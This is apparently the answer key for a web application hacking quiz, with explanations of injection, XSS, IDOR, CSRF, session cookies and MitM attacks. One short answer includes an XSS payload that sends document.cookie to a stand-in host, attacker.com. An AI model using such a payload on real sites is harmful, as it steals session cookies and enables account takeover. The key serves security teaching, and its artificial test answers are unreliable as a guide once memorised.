# Answers: Quiz - Web Application Hacking

Here are the answers to the quiz found in `web_hacking/quiz.md`.

## Multiple Choice

1.  **Which OWASP Top 10 vulnerability involves an attacker sending hostile data to an interpreter as part of a command or query?**
    *   **C. Injection (e.g., SQLi, Command Injection)**
    *   *Explanation:* Injection flaws cover vulnerabilities where attacker-supplied data can manipulate backend interpreters like SQL, LDAP, OS commands, etc.

2.  **What is the primary defense against SQL Injection vulnerabilities?**
    *   **C. Using prepared statements (parameterized queries).**
    *   *Explanation:* Prepared statements ensure that user input is treated as data, not as executable code, preventing it from altering the SQL query's structure.

3.  **A web application reflects user input from a URL parameter directly onto the page without proper sanitization. If this input includes a script, what vulnerability is present?**
    *   **B. Reflected Cross-Site Scripting (XSS)**
    *   *Explanation:* Reflected XSS occurs when malicious script is passed in the request (e.g., URL parameter) and then reflected back and executed in the victim's browser.

4.  **Which of the following best describes an Insecure Direct Object Reference (IDOR) vulnerability?**
    *   **C. An application exposes a reference to an internal implementation object (e.g., a file or database key) without proper access control.**
    *   *Explanation:* IDOR occurs when an attacker can change an ID parameter (e.g., user_id, file_id) to access resources they are not authorized for.

5.  **What is a common mitigation technique for Cross-Site Request Forgery (CSRF)?**
    *   **B. Using anti-CSRF tokens (synchronizer tokens).**
    *   *Explanation:* Anti-CSRF tokens are unique, unpredictable values that the server checks to ensure a state-changing request was intentionally submitted by the user from within the application.

## True/False

6.  **True or False:** Client-side validation is sufficient to prevent XSS vulnerabilities.
    *   **False.**
    *   *Explanation:* Client-side validation can be easily bypassed by an attacker (e.g., by disabling JavaScript or modifying requests with a proxy). Server-side validation and output encoding are crucial for preventing XSS.

7.  **True or False:** "Security through obscurity" (e.g., hiding directory names) is a robust defense against web attacks.
    *   **False.**
    *   *Explanation:* Obscurity might make it slightly harder for casual attackers but is not a reliable security control. Determined attackers can often find hidden resources through other means. Robust security relies on proper configuration and access controls.

8.  **True or False:** HTTPS encrypts the URL path and query parameters, preventing them from being seen by network sniffers.
    *   **True.**
    *   *Explanation:* The path and query string are part of the HTTP request data that is encrypted within the TLS tunnel once the secure connection is established. While the hostname is visible via SNI during the TLS handshake, the rest of the URL (path and query parameters) is protected from passive external sniffers.

## Short Answer

9.  **Explain the difference between Stored XSS and Reflected XSS.**
    *   *Answer:* **Stored XSS** occurs when the malicious script is permanently stored on the target server (e.g., in a database via a comment field) and is served to any user who views that content. **Reflected XSS** occurs when the malicious script is injected via a request (e.g., a URL parameter or form submission) and is immediately reflected back by the web server in the response and executed in the victim's browser. It requires the victim to click a crafted link or submit a malicious form.

10. **What is the purpose of a session cookie in a web application? List one way an attacker might try to compromise a session cookie.**
    *   *Answer:* The purpose of a session cookie is to maintain a user's logged-in state and track their activity across multiple requests, as HTTP is stateless. It allows the server to identify the user without requiring them to log in for every page view.
    *   One way an attacker might compromise a session cookie is by:
        *   Stealing it via an XSS attack (`<script>document.location='http://attacker.com/cookiestealer.php?cookie=' + document.cookie</script>`).
        *   Sniffing it from unencrypted (HTTP) traffic.
        *   Session fixation (tricking a user into using a session ID known to the attacker).
        *   Guessing predictable session IDs.

11. **Briefly describe what a "Man-in-the-Middle" (MitM) attack is in the context of web applications.**
    *   *Answer:* A Man-in-the-Middle (MitM) attack occurs when an attacker secretly positions themselves between a user and a web application, intercepting and potentially altering their communication. For example, an attacker on the same Wi-Fi network could intercept HTTP traffic, or if they can trick a user into installing a rogue CA certificate, they could even intercept and decrypt HTTPS traffic.

12. **Why is it important to keep web server software and all third-party components (libraries, frameworks) up to date?**
    *   *Answer:* It's important because software and components often have vulnerabilities discovered over time. Updates and patches are released by vendors to fix these known vulnerabilities. Failing to update leaves the web application exposed to attacks that exploit these known weaknesses, which is a common way systems are compromised (often referred to as "N-day" vulnerabilities).
